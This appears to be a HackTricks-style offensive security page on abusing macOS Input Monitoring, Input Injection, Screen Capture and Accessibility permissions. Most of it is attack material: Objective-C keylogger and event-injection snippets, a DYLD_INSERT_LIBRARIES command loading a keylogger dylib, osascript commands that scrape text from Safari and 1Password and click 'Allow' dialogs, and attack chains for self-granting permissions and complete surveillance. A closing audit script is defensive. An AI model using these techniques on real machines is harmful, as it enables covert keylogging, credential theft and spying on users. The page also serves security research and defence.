# macOS Input Monitoring, Screen Capture & Accessibility Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Three related TCC services control how applications can observe and interact with the user's desktop session:

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Read all keyboard and mouse events system-wide (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Inject synthetic keyboard and mouse events |
| `kTCCServiceScreenCapture` | **Screen Capture** | Read the display buffer, take screenshots, record screen |
| `kTCCServiceAccessibility` | **Accessibility** | Control other applications via AXUIElement API, read UI elements |

These permissions are **the most dangerous combination** on macOS — together they provide:
- Full keylogging of every keystroke (passwords, messages, credit cards)
- Screen recording of all visible content
- Synthetic input injection (click buttons, approve dialogs)
- Complete GUI control equivalent to physical access

---

## Input Monitoring (kTCCServiceListenEvent)

### How It Works

macOS uses the **`CGEventTap` API** to allow processes to intercept input events from the Quartz event system. A process with ListenEvent permission can create an event tap that receives **every keyboard and mouse event** before or after they reach the target application.

```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
    kCGSessionEventTap,        // Tap at the session level (all apps)
    kCGHeadInsertEventTap,     // Insert before the event reaches the app
    kCGEventTapOptionListenOnly, // Listen only (don't modify events)
    mask,
    eventCallback,             // Callback receives every matching event
    NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
                         CGEventRef event, void *userInfo) {
    UniChar chars[4];
    UniCharCount len;
    CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
    // chars now contains what the user typed
    return event;
}
```

### Finding Entitled Binaries

```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```

### Attack: Keylogging via Code Injection

If a binary with ListenEvent permission also has **disabled library validation** or **allows DYLD environment variables**, an attacker can inject a dylib that registers a CGEventTap:

```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
  grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```

The injected dylib inherits the target's ListenEvent TCC grant and captures all keystrokes.

### Attack: Credential Harvesting

A sophisticated keylogger can correlate keystrokes with the active application:

```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```

---

## Input Injection (kTCCServicePostEvent)

### How It Works

PostEvent permission allows creating an event tap with **`kCGEventTapOptionDefault`** (can modify/inject events) instead of ListenOnly. This enables:

```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
                                           CGPointMake(100, 200),
                                           kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```

### Attack: Automated TCC Prompt Approval

With PostEvent, an attacker can **simulate clicking "Allow"** on TCC permission dialogs:

```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```

---

## Screen Capture (kTCCServiceScreenCapture)

### How It Works

Screen capture permission allows reading the display buffer using:
- **`CGWindowListCreateImage`** — capture any window or full screen
- **`ScreenCaptureKit`** (macOS 12.3+) — modern API for streaming screen content
- **`CGDisplayStream`** — hardware-accelerated screen capture

```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
    CGRectInfinite,
    kCGWindowListOptionOnScreenOnly,
    kCGNullWindowID,
    kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```

### Finding Screen Capture Clients

```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
  "SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```

### Attack: Credential Capture via OCR

An injected screen capture process can periodically capture frames and use OCR to extract passwords:

```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```

> [!WARNING]
> Starting with **macOS Sonoma**, screen capture shows a **persistent indicator** in the menu bar. On older versions, screen recording could be completely silent. However, a brief single-frame capture may still go unnoticed by users.

### Attack: Session Recording

Continuous screen recording provides a complete replay of the user's session:

```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```

---

## Accessibility (kTCCServiceAccessibility)

### How It Works

Accessibility access grants control over other applications via the **AXUIElement API**. A process with accessibility can:

1. **Read** any UI element in any application (text fields, labels, buttons, menus)
2. **Click** buttons and interact with controls
3. **Type** text into any text field
4. **Navigate** menus and dialogs
5. **Scrape** displayed data from any running application

```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```

### Attack: Self-Granting TCC Permissions

The most dangerous accessibility abuse is **navigating System Settings to grant your own malware additional permissions**:

```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
    activate
    delay 1
end tell
tell application "System Events"
    tell process "System Settings"
        -- Navigate to Privacy & Security
        -- Click the lock to authenticate
        -- Toggle on Full Disk Access for the malware
    end tell
end tell'
```

### Attack: Cross-Application Data Scraping

```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```

### Attack: Automated User Actions

```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
    tell process "Finder"
        click button "Allow" of window 1
    end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```

---

## Attack Chains

### Chain: Input Monitoring + Screen Capture = Complete Surveillance

```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```

### Chain: Accessibility + PostEvent = Full Remote Control

```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```

### Chain: Accessibility → Self-Grant Camera/Mic → Surveillance

```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```

---

## Detection & Enumeration

```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
  echo -e "\n[*] Database: $db"
  for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
    echo "  $svc:"
    sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
  done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
  AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```

## References

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
